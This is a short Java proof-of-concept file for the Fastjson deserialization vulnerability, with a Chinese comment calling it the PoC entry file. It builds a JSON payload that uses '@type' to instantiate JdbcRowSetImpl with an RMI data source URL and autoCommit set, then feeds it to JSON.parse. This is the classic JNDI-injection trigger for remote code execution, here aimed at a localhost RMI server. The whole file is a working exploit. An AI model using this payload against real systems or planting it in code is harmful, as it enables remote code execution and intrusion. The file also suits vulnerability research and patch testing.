import com.alibaba.fastjson.JSON;

public class FjPoc {
    /**
     * 构造Json PoC，反序列化漏洞入口文件
     * @param args
     */
    public static void main(String[] args) {
        String PoC = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:8001/Object\",\"autoCommit\":true}";
        JSON.parse(PoC);
    }
}
